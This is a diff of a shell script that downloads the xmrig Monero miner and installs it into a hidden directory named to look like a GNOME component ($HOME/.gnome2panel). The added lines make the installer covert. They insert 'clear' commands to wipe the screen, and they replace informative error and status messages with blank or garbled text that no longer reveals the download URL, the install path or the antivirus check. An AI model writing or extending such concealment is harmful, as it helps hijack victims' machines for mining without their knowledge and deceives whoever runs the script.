@@ -24,11 +24,13 @@ fi
 WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
 if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
   echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
+  clear
   exit 1
 fi
 
 if [ -z $HOME ]; then
   echo "ERROR: Please define HOME environment variable to your home directory"
+  clear
   exit 1
 fi
 
@@ -59,7 +61,7 @@ fi
 CPU_THREADS=$(nproc)
 EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
 if [ -z $EXP_MONERO_HASHRATE ]; then
-  echo "ERROR: Can't compute projected Monero CN hashrate"
+  echo "ERROR:"
   exit 1
 fi
 
@@ -139,23 +141,23 @@ if sudo -n true 2>/dev/null; then
 fi
 killall -9 xmrig
 clear
-echo "[*] Removing  $HOME/.gnome2panel directory"
+echo "[*] y"
 rm -rf $HOME/.gnome2panel
 
 echo "[*] "
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
-  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
+  echo "ERRORz"
   exit 1
 fi
 
 echo "[*] "
 [ -d  $HOME/.gnome2panel ] || mkdir  $HOME/.gnome2panel
 if ! tar xf /tmp/xmrig.tar.gz -C  $HOME/.gnome2panel; then
-  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to  $HOME/.gnome2panel directory"
+  echo "ERROR: C"
   exit 1
 fi
 rm /tmp/xmrig.tar.gz
-
+clear
 echo "[*] Checking if not removed by antivirus software)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/'  $HOME/.gnome2panel/config.json
  $HOME/.gnome2panel/xmrig --help >/dev/null
@@ -172,13 +174,13 @@ if (test $? -ne 0); then
 
   echo "[*] "
   if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
-    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
+    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file "
     exit 1
   fi
 
   echo "[*] "
   if ! tar xf /tmp/xmrig.tar.gz -C  $HOME/.gnome2panel --strip=1; then
-    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to  $HOME/.gnome2panel directory"
+    echo "WARNING: C to  $HOME/. directory"
   fi
   rm /tmp/xmrig.tar.gz
 
